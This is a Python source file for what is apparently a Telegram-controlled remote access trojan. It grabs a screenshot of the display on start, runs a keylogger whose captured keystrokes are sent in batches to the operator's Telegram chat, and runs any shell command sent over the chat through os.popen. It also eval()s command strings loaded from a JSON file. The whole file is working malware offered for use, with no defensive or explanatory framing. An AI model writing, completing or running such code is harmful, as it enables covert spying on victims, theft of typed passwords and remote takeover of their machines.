import telepot
from telepot.loop import MessageLoop
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import os
import subprocess
import json
import time
from klog import klogger
from pprint import pprint
import threading
import traceback

# keep_alive.keep_alive()


bot = telepot.Bot("BOT_API_KEY")
chat_id = "CHAT_ID"

cmd = 0


keylogCheck = False

f = open('commands.json') 
commands = json.load(f)
print(list(commands.keys()))

# Helper functions ------------------------------------------------------------

def takeScreenshot():
    os.system("ffmpeg -y -f x11grab -framerate 1 -i :0.0 -vframes 1 output.jpeg")
    f = open("output.jpeg", "rb")
    bot.sendPhoto(chat_id, f)
    os.remove("output.jpeg")


def runCmd(msg):
    text = msg["text"]
    global cmd
    if cmd == 0:
        cmd = 1
        bot.sendMessage(chat_id, "Send terminal commands:")
    if text == '/cmd':
        pass
    elif (text != "exit") and isinstance(text, str):
        output = 'Output:\n\n' + str(os.popen(text).read())
        # os.system(text)
        bot.sendMessage(chat_id, output)
    else:
        cmd = 0
        bot.sendMessage(chat_id, "CMD mode deactivated!")


def checkKeylogs():
    # Loop for checking if logfile has more that 100 characters.
    while keylogCheck == True:
        try:
            recordKey = open(klogger.recordfile,"r")
            klogs = recordKey.read()
            if(len(klogs) > 100):
                with open(klogger.recordfile, "w") as f:
                    f.write('')
                bot.sendMessage(chat_id, "Keylogs:\n\n" + klogs)
                klogs = ''
            print("File was read!")
            time.sleep(20)
        except Exception:
            print(str(traceback.format_exc()))

    
    # As global variable 'keylogCheck' becomes False, we'll send keylog data and flash the file.
    with open(klogger.recordfile, "r") as f:
        bot.sendMessage(chat_id, "Keylogs:\n\n" + str(f.read()))
    with open(klogger.recordfile, "w") as f:
        f.write('')


def keylogger(step):
    global keylogCheck
    if step == 1:
        keylogCheck = True
        klogger.start()
        checkKeylogsThread = threading.Thread(target = checkKeylogs)
        checkKeylogsThread.start()
        bot.sendMessage(chat_id, "# Keylogger process has been started!")
    else:
        try:
            keylogCheck = False
            klogger.stop()
            bot.sendMessage(chat_id, "# Keylogger process has been stopped!")
        except Exception:
            bot.sendMessage(chat_id, "# Keylogger process couldn't be stopped! \nMaybe keylogger process was killed or wasn't started for the first time!")


def help():
    reply = ''
    for element in commands.keys():
        reply += element + " - " + commands[element][1] + "\n"
    
    print(reply)
    bot.sendMessage(chat_id, reply)


# Main Controller Functions --------------------------------------------------


def on_chat_message(msg):
    global cmd
    pprint(msg)
    content_type, chat_type, chat_id = telepot.glance(msg)
    # print(content_type, chat_type, chat_id)

    if content_type == "text":
        stat = 0
        text = msg["text"]
        if cmd == 1:
            runCmd(msg)
        else:
            for element in commands.keys():
                if element in text:
                    stat = 1
                    eval(commands[element][0])
                    break

            if stat == 0:
                bot.sendMessage(chat_id, "Unknown Command!")
        

MessageLoop(bot, on_chat_message).run_as_thread()

bot.sendMessage(chat_id, "### Bot started!")
takeScreenshot()
keylogger(1)

while 1:
    time.sleep(10)